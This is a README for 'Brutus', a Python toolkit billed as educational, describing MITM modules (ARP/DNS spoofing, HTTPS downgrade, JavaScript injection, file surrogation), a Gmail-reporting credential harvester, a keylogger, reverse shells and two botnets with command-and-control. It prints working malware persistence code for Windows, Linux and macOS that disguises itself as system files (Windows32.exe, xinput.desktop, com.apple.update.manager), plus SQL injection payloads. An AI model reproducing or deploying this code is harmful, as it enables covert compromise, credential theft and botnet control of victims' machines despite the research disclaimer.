# Brutus: An All-in-One Exploitation Tool

__Disclaimer: This software and all contents therein were created for research use only. I neither condone nor hold, in any capacity, responsibility for the actions of those who might intend to use this software in a manner malicious or otherwise illegal.__

## Table of Contents

 - [Introduction](#intro) 
    * [About](#about)
 - [Installation](#install) 
 - [Usage](#usage) 
 - [Features](#features)
    * [Documentation](#docs)
        + [Module: MAC Address Generation](#macchanger)
        + [Module: ARP-driven Network Scanner](#networkscanner)
        + [Module: Automated ARP Spoofing](#arpspoof)
        + [Module: Automated DNS Spoofing](#dnsspoof)
        + [Module: Packet Sniffer](#packetsniff)
        + [Module: File Surrogation](#surrogate)
        + [Module: Javascript Injection](#injectjs)
        + [Module: Vulnerability Scanner](#vulnscan)
        + [Payload: Reverse Shell](#revshell)
        + [General: Persistence Methods](#persistence)
 - [Development Notes](#notes)

## <a name="intro"></a> Brutus: and Introduction
Brutus is a Python-powered educational toolkit which automates pre and post-connection network-based exploits, as well as web-based reconnaissance. Brutus seldom relies on dependencies without the standard library, and features a fully interactive command-line interface which dynamically applies type-checking and data validation against user-input. 

Brutus is designed to be an extensible framework to which new modules can easily be integrated.

### <a name="about"></a> A Brief Foray into Brutus' Background
Brutus is a penetration-testing toolkit built with the intention of introducing neophyte security researchers or the otherwise interested to the underlying mechanisms which power the myriad popular exploitation tools we use today. For this reason, Brutus is largely written in Python - my hope is that this decision lends to its being an accessible and extensible framework for conducting network and web-based exploits (and learning about them), and in such applications, both pre-access and post access contexts.

That is, if you're looking at this code and wondering why Brutus violates the long-standing computer science tenet that is "Don't re-invent the wheel", well, this is why. The intention here is to *write code* to automate processes which most certainly can be done with an ever-fluctuating arsenal of pre-made tools. Brutus' goal is to use as few dependencies as is possible (and reasonable), while remaining reasonably performant such that it *can* be applied in the field (see disclaimer). 

Brutus began as an explorative project - I was taking popular pen-testing tools or paradigms (e.g. Bettercap, Wireshark, et al; the latter - ARP Spoofing, for instance) and figuring out how they worked, and how to create my own incarnations with Python...all while relying on as few dependencies (beyond the standard library, that is) as I could. Some such endeavors truly would be 're-inventing the wheel', such as surrogating Scapy with a custom module; for reasons quite apparent, I did not endeavor to do this. 

That's all for now. I am releasing a beta version of this and will assuredly add more to this section as my code gets picked apart ;-)

## <a name="install"></a> Installation
## <a name="usage"></a> Usage

## <a name="features"></a> Brutus: Features and Included Modules

Brutus includes several modules which can be generalized as belonging to three macro-categories: *network-based*, *web-based*, and *payloads*. The latter category is a library of compilers and accompanying payloads - payloads can be compiled via Brutus' interactive command-line menu; compiled payloads can subsequently be loaded into any of Brutus' applicable network-based modules. 

There is one unique exception to this: Brutus ships with two complete botnets and accompanying client/bot compilers. One botnet architecture is socket-based and optimized for intra-network usage. Its Command and Control server is operated via the Brutus CLI. 

The second architecture includes a full web-based interface which is optionally launched from the CLI (presume you are running Brutus on a VPS). Else, Brutus can persist your server configurations and auto-compile new clients per said configurations, effectively making the server a detached entity which can be managed via the Brutus CLI (despite the server being installed remotely). *Note: Botnet integrations into Brutus are still under development.*

Follows are the included modules:

**Network-based**
 - MAC Address Generator (set MAC address to user-specified or randomized OUI. Options for OUI vendor prefix, unicast/multicast, and UAA/LAA per IEEE specifications)
 - Network Scanner (scans given IP range to discover all (including hidden) devices on a given network)
 - ARP Spoofer (establish MITM)
 - DNS Spoofer
 - Packet Sniffer 
 - File Surrogator (surrogate via REGEX matching)
 - Javascript Injector 
 - Reverse-Shell Listener (a new Listener is instantiated and added to the UI whenever an accompanying payload has been compiled - *under development*)

 **Web-based**
 - Link Harvester (harvest all URL references on a given target)
 - Subdomain Mapper (maps all subdomains as matched against a given wordlist)
 - Vulnerability Scanner (renders sitemap, automates XSS and SQLi testing across several vectors)
 - Credential Brute Force (*under development*)

 **Payloads**
  Note: Remote Report payloads report to throwaway Gmail accounts
  - Remote Report Credential Harvester (harvests all credentials and cleanup; two versions - OS-agnostic and Windows-specific)
  - Injection (download any served file to target)
  - Persistent Remote Report Keylogger
  - Persistent Reverse Shell (an OS-agnostic socket-based reverse shell)
  - Download + Execute (downloads executable, runs quietly, self-cleans *under development*)

**Intra-Network Botnet**
  - Socket-based Command and Control server with multi-threaded concurrency. Payloads are OS-agnostic and are persistent across Windows, Linux, and MacOS. 
  - Features include:
    * Persistence on Windows, Linux, MacOS
    * En masse command-execution
    * Multiple concurrent reverse shell sessions
    * Auto-reconnect (at user-specified intervals)
    * Remote Dropper (download anything onto host)
    * Screenshot (OS-agnostic)
    * Keylogger 
    * Compress files on host machine
    * Return all host information
    * Direct download from host
    * Automated sockets - hosts/slaves can reconnect even if server goes down.

**Inter-Network Botnet**
  - HTTPS-based botnet with optional SSL verification. Robust Command and Control server with full 
  user-interface. 
  - Features include:
    * Persistence on Windows, Linux, MacOS
    * Web interface with console sessions.
    * En masse command-execution
    * Multiple concurrent reverse shell sessions
    * Auto-reconnect (at user-specified intervals)
    * Remote Dropper (download anything onto host)
    * Screenshot (OS-agnostic)
    * Keylogger 
    * Compress files on host machine
    * Return all host information
    * Self-destruct / Auto-clean
    * Execute shell code
    * Direct Download / Upload


**Utilities/Scripts** 
  - Flush IP Tables (maintains port-forwarding config)
  - Refresh OUI Directory  
  - IP Tables, Reset All
  - Downgrade HTTPS to HTTP
  - Enable Monitor Mode 
  - Enable Port Forwarding
  - Mock Import (allows user to simulate dependencies on unsupported systems e.g. Netlifyqueue)

### <a name="docs"></a> In-depth Documentation

#### <a name="macchanger"></a>  48-bit MAC Address Changer ([view source](https://github.com/MatthewZito/Brutus/blob/master/packages/mac_changer/mac_changer.py))

NOTE: This tool is for 48-bit MACs, with a %02x default byte format.

MAC (Media Access Control) is a permanent, physical, and unique address assigned to network interfaces by device manufacturers. This means even your wireless card, for instance, has its own unique MAC address.

The MAC address, analogous to an IP on the internet, is utilized within a network in order to facilitate the proper delivery of resources and data (i.e. packets). An interaction will generally consist of a source MAC and a destination MAC. MAC addresses can identify you, be filtered, or otherwise access-restricted.

Important to note is these unique addresses are not ephemeral; they are persistent and will remain associated with a device were a user to install it in another machine. But the two don't have to be inextricably intertwined...

This module will accept as user-input any given wireless device and any valid MAC address to which the user wishes to reassign said device. The program is simple such that I need not explain it much further: it utilizes the subprocess module to automate the sequence of the necessary shell commands to bring the wireless interface down, reassign the MAC, and reinitialize it. 

If you are actively changing your MAC address, it might be prudent to have some sort of validation structure or higher order method to ensure that 1) the wireless device exists, 2) the wireless device accommodates a MAC address, 3) the user-input MAC address is of a valid format, and 4) the wireless device's MAC address has successfully been updated. This tool automates these functions.

By selecting the 'generate' option in lieu of a specific MAC address, the program will generate a valid MAC address per IEEE specifications. I'm excited to have implemented extended functionality for generating not only wholly random (and valid) MAC addresses, but MAC addresses which either begin with a specific vendor prefix (OUI), or are generated with multicast and/or UAA options. These options trigger byte-code logic in the generator method, which are augmented per IEEE specifications. Learn more about MAC addresses [here](https://en.wikipedia.org/wiki/Organizationally_unique_identifier#Bit-reversed_representation).


#### <a name="networkscanner"></a> ARP-Based Network Scanner ([view source](https://github.com/MatthewZito/Brutus/blob/master/packages/network_scanner/network_scanner.py))

The network scanner is another very useful tool, and a formidable one when used in conjunction with the aforementioned MAC changer. This scanner utilizes ARP request functionality by accepting as user input a valid ipv4 or ipv6 IP address and accompanying - albeit optional - subnet range. 

The program then takes the given IP and/or range, then validates them per IEEE
specifications (again, this validation is run against ipv4 and ipv6 standards). Finally, a broadcast object is instantiated with the given IP and a generated ethernet frame; this object returns to us a list of all connected devices within the given network and accompanying range, mapping their IPs to respective MAC addresses.

The program outputs a table with these associations, which then might be used as input for the MAC changer should circumstances necessitate it.

#### <a name="arpspoof"></a>  Automated ARP Spoofing ([view source](https://github.com/MatthewZito/Brutus/blob/master/packages/arp_spoofer/arp_spoof.py))

The ARP Spoof module enables us to redirect the flow of packets in a given network by simulateously manipulating the ARP tables of a given target client and its network's gateway. This module auto-enables port forwarding during this process, and dynamically constructs and sends ARP packets.  

When the module is terminated by the user, the targets' ARP tables are reset, so as not to leave the controller in a precarous situation (plus, it's the nice thing to do). 

Because this process places the controller in the middle of the packet-flow between the client and AP, the controller therefore has access to all dataflow (dealing with potential encryption of said data is a task for another script). From here, our myriad options for packet-flow orchestration become readily apparent: surrogation of code by way of automation and regex matching, forced 300-status redirects, remote access, et al. Fortunately, Brutus can automate this, too.

#### <a name="dnsspoof"></a>  Automated DNS Spoofing 

#### <a name="packetsniff"></a>  HTTP Packet Sniffer ([view source](https://github.com/MatthewZito/Brutus/blob/master/packages/packet_sniffer/packet_sniff.py))

The packet sniffer is an excellent module to employ after running the ARP Spoofer; it creates a dataflow of all intercepted HTTP packets' data which includes either URLs, or possible user credentials. 

The scipt is extensible and can accomodate a variety of protocols by instantiating the listener object with one of many available filters. Note that Brutus automatically downgrades HTTPS, so unless HSTS is involved, the dataflow should be quite steady.

#### <a name="surrogate"></a> File Surrogation ([view source](https://github.com/MatthewZito/Brutus/blob/master/packages/file_surrogator/file_surrogation.py))

The File Surrogation module allows us to surrogate all files of a given type of file extension with another, effectively further expanding the many attack-vectors afforded by Brutus. The file surrogation process necessitates MITM status; as such Brutus will prompt you prior to launching this module. 

The process modifies the IP Tables configuration by enabling port-forwarding, instantiating a queue (into which packets are redirected), and downgrading HTTPS. At this time, the user will be prompted to enable SSLStrip (unfortunately, one dependency Brutus *does* need...for now); the packet queue will flow into SSLStrip for downgrading. 

The Surrogator module then programatically determines how to process each packet in the given queue. It first parses and separates HTTP requests/responses and detects file downloads by matching against (currently a string, soon a REGEX). Last, the Surrogator determines corresponding file request/response objects, enabling packet interception and supplantation of the response load (file). The module keeps track of correlated packet objects by indexing all syn/ack correspondence.

Note the Surrogator Queue is able to redirect packets by setting a redirect header; this header will later be dynamically loaded from Brutus' variables directory, enabling user-directed header manipulation.

#### <a name="injectjs"></a> Javascript Injection ([view source](https://github.com/MatthewZito/Brutus/blob/master/packages/javascript_injector/code_injector.py))

The Javascript Injection module works much in the same fashion as the File Surrogation module (it even utilizes many of the same utils/scripts), save for how the packet dissection process is programatically determined. This module *does* utilize Brutus' global variables directory, parsing and matching HTML source 
to determine where a user-input string of Javascript code will be injected.

The Injection module then recalculates the length of the packet response object so as to accommodate the revised length (i.e. the packet plus the JS injection, sans whatever said injection supplanted) and bypass anti-tampering counter-measures. We're also downgrading the protocol to HTTP 1.0 because there can be some buffer issues among other things when encountering a variety of protocol versions - it's prudent to set all to the same version so we can better expect I/O. 

That brings me to a rather critical point here, that much of this programming pertains to anticipating very *specific* types of data and formats thereof. This becomes rather problematic when dealing with datastreams (i.e. HTTP traffic); we cannot always anticipate that data will not be malformed. As such, this module processes packets through a series of validators and type-checkers to ensure we are dealing with the types of packet objects we expect.

#### <a name="vulnscan"></a> Web: Vulnerability Scanner ([view source](https://github.com/MatthewZito/Brutus/blob/master/packages/web_tools/scanner/scanner.py))

The vulnerability scanner is a powerful utility which automates the processing of testing several attack vectors against a given target. The scanner is designed in such a way that additional tests can be loaded as external modules. 

The scanner begins by sequentially rendering a sitemap object of the user-specified target website (sans any subdomains or paths specified in the similarly user-designated 'ignore' list). Further, the scanner can dynamically conduct mapping assessments inside of a session, if the option to do so has been selected by the user. This will allow the scanner to access the full site, assuming a user session is necessitated. 

Once the complete sitemap object has been collated, the scanner begins a series of evaluations. At this moment in time, the native evaluations are: 
 - Cross-site Scripting (XSS) via URL parameters,
 - Cross-site Scripting (XSS) via form submission,
 - Tautological SQL injection via URL parameters,
 - Tautological SQL injection via URL parameters, flagging a specific database configuration

Brutus deploys a series of payloads, or 'simulacra' (a representation), to evaluate these vulnerabilities. Each XSS simulacrum tests a different vector (mirrored, reflected, etc), while SQLi simulacra likewise evaluate against different vectors (at this moment all within the realm of tautologies). 

SQL Injection Simulacra:
```
SQLI_SIMULACRA = ["'", "' or 1=1;--", "1\' or \'1\' = \'1\''", "' or 1=1--","' or 1=1#","' or 1=1/*","') or '1'='1--", "') or ('1'='1--"]
DB_SQLI_SIMULACRA = ["'", "')", "';", '"', '")', '";', '`', '`)', '`;', '\\', "%27", "%%2727", "%25%27", "%60", "%5C"]
```

The interesting thing about the SQLi evaluations is that Brutus checks the HTML response objects against a dictionary of various SQL databases' proprietary response indicators (the ones which signify a vulnerability, that is), and returns the specific database to which the vulnerability applies. In short, Brutus does this research for you. 

Database-specific SQL errors:
```
db_errors = {
    "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"MySQL Query fail.*", r"SQL syntax.*MariaDB server"),
    "PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"Warning.*PostgreSQL"),
    "Microsoft SQL Server": (r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*odbc_.*", r"Warning.*mssql_", r"Msg \d+, Level \d+, State \d+", r"Unclosed quotation mark after the character string", r"Microsoft OLE DB Provider for ODBC Drivers"),
    "Microsoft Access": (r"Microsoft Access Driver", r"Access Database Engine", r"Microsoft JET Database Engine", r".*Syntax error.*query expression"),
    "Oracle": (r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Warning.*oci_.*", "Microsoft OLE DB Provider for Oracle"),
    "IBM DB2": (r"CLI Driver.*DB2", r"DB2 SQL error"),
    "SQLite": (r"SQLite/JDBCDriver", r"System.Data.SQLite.SQLiteException"),
    "Informix": (r"Warning.*ibase_.*", r"com.informix.jdbc"),
    "Sybase": (r"Warning.*sybase.*", r"Sybase message")
}
```

#### <a name="revshell"></a> Reverse Shell Payload ([view source](https://github.com/MatthewZito/Brutus/blob/master/pending/backdoor/backdoor.py))

The reverse shell payload instantiates a persistent backdoor on the host machine (See [persistence methods](#persistence) for more information). The payload then attempts to open a socket connection to the controller's listener instance, which Brutus will spawn and load into the user-interface upon payload compilation. 

The listener instance utilizes mutli-threaded concurrency and stores host connections as sessions. These sessions can be toggled via the primary console thread, effectively making even the Backdoor feature a botnet.

Once connected, the reverse shell accepts commands (UNIX-like piping is not yet supported) and supports file upload/download between the controller and host. Simultaneous-broadcast command execution is also supported.

*Note: This module is under development*


#### <a name="persistence"></a> Persistence Methods

Given all Brutus' payloads are quasi-polymorphic, the method by which persistence is established is programatically determined qua the host operating system. Brutus, unlike many exploitation tools, includes persistence methods for Windows, Linux, and MacOS.

Currently, the default Windows persistence method entails the long-standing Windows registry manipulation.
```
def persist_windows(self):
        self.persisted_path = os.environ["appdata"] + "\\Windows32.exe"
        if not os.path.exists(self.persisted_path):
            shutil.copyfile(sys.executable, self.persisted_path)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v win32 /t REG_SZ /d "' + self.persisted_path + '"', shell=True)

```

On Linux machines, Brutus takes advantage of the autostart feature; payloads copy themselves into the hidden autostart configuration directory (if it does not exist, it is created); simultaneously, a new `.desktop` job entry is made in the autostart directory, pointing at the new, hidden executable. Last, the executable's permissions are edited (`chmod`) for obvious reasons. This methodology is particularly messy for the target in that a curious, recursive incident may occur during processing: the system command signals which coordinate the copying of the persistent executable are sometimes issued *after* the executable is removed, meaning the hidden executable is reinsantiated on startup even if the target has discovered and removed it. 

```
def persist_linux(self):
        home_config_directory = os.path.expanduser('~') + "/.config/"
        autostart_path = home_config_directory + "/autostart/"
        autostart_file = autostart_path + "xinput.desktop"
        if not os.path.isfile(autostart_file):
            try:
                os.makedirs(autostart_path)
            except OSError:
                pass
            self.persisted_path = home_config_directory + "xnput"
            shutil.copyfile(sys.executable, self.persisted_path)
            self.chmod_to_exec(self.persisted_path)
            with open(autostart_file, 'w') as out:
                out.write("[Desktop Entry]\nType=Application\nX-GNOME-Autostart-enabled=true\n")
                out.write("Name=Xinput\nExec=" + self.persisted_path + "\n")
            self.chmod_to_exec(autostart_file)
            subprocess.Popen(self.persisted_path)
            sys.exit()
```
An alternate Linux persistence method utilizes the crontab, though this methodology is a bit less discreet per my assessment.

Last, MacOS persistence. This one was tricky, but it works. Here, we exploit macOS' LaunchAgent feature. We're creating our own Apple system executable by interpolating into our `plist` template the generated values.

First Brutus grabs our template from its global variables:
```
template_plist = string.Template("""#!/bin/bash
echo '<plist version="1.0">
<dict>
<key>Label</key>
<string>${LABEL}</string>
<key>ProgramArguments</key>
<array>
<string>/usr/bin/python</string>
<string>${FILE}</string>
</array>
<key>RunAtLoad</key>
<true/>
<key>StartInterval</key>
<integer>180</integer>
<key>AbandonProcessGroup</key>
<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/${LABEL}.plist
chmod 600 ~/Library/LaunchAgents/${LABEL}.plist
launchctl load ~/Library/LaunchAgents/${LABEL}.plist
exit""")
```

Then, Brutus generates the executable's attributes and interpolates them into the template, which is installed as a launch agent:

```
def persist_macos(self):
        value = sys.executable
        label = "com.apple.update.manager"
        file_path = f"/var/tmp/.{label}.sh"
        bash = template_plist.substitute(LABEL=label, FILE=value)
        try:
            if (not os.path.exists("/var/tmp")):
                os.makedirs("/var/tmp")
            with open(file_path, "w") as file:
                file.write(bash)
            bin_sh = bytes().join(subprocess.Popen(f"/bin/sh {file_path}", 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
            time.sleep(1)
            launch_agent= os.path.join(os.environ.get('HOME'), f"Library/LaunchAgents/{label}.plist")
            if (os.path.isfile(launch_agent)):
                os.remove(file_path)
            else:
                pass
        except:
            pass
```

#### <a name="botnet"></a> The Brutus Botnet Modules

([intra-network botnet source](https://github.com/MatthewZito/Brutus/tree/master/pending/intra_botnet))
([inter-network botnet source](https://github.com/MatthewZito/Brutus/tree/master/pending/inter_botnet))

The Brutus botnet really is two separate modules: an intra-network botnet, and an inter-network botnet. The difference here is critical, as we are able to refine the system architectures thereof per their respective purposes: for instance, the intra-network botnet relies on socket connections and a less robust multi-threaded model (i.e. it is intended to collate less targets).


The inner-network botnet is a far more robust architecture, intended for less ephemeral applications than the intra-network system. It must also be noted that this system architecture is based on and uses code from SweetSoftware's Ares botnet. This incarnation of Ares is far more performant, scalable, and secure. 

This botnet optionally utilizes SSL verification. Brutus spawns a web interface and SQL database per user-provided configurations; these configurations are then utilized in compilation of client/slave instances. This means a user can launch the user-interface and manage their targets therein, all from Brutus' interactive command line.

Compiled slaves are OS-agnostic and persistent. They are dynamically compiled with a `connect_interval` and a `max_failed_connections` int - if the slave fails to connect, at *`connect_interval`* seconds, *`max_failed_connections`* times, the slave self destructs (and cleans up after itself). As aforementioned, SSL verification can be configured such that the slaves must associate with the Command and Control server upon report. 

The slave instances keep local tmp logs to which all reverse shell, jobs/processes and assignments, and epistemological output is written. These ephemeral logs are then posted to the Command and Control server's `report` API endpoint. 

The Command and Control server utilizes a RESTful API architecture to coordinate *n* slaves in a scalable and robust manner. Slaves report to their own dynamic endpoints (URL params as slave ID), which are validated against the SQL database, to which all slave information is serialized and written.

The Command and Control server also utilizes MD5 for user authentication (critical functions, such as removing/killing slaves are restricted to the admin user) - the primary controller is the administrator, though user accounts can be spawned and deleted should the controller wish to allow other users access to the botnet C2 instance at any point in given time.

A major next step in development is a security module, which will wrap all correspondence in AES encryption. I am also currently working on enforcing a public/private key-pair exchange on initial client/slave report, and coding a custom Diffie-Hellman script for associating. 

#### <a name="notes"></a> Development Notes

You may notice many of these scripts are not yet optimized. Payload code has not been obfuscated, connections are left unencrypted, and much of the OOP architecture could be refactored. These are tasks I have been working on, but at the pace of someone working on many projects simulataneously. As such, please see the CONTRIBUTING doc; Brutus could certainly use your help.

Brutus began as several, disparate programs - only after I had written them did I realize I should aggregate them into a singular tool. Thus, there are, of course, kinks, and I am working on ironing them out.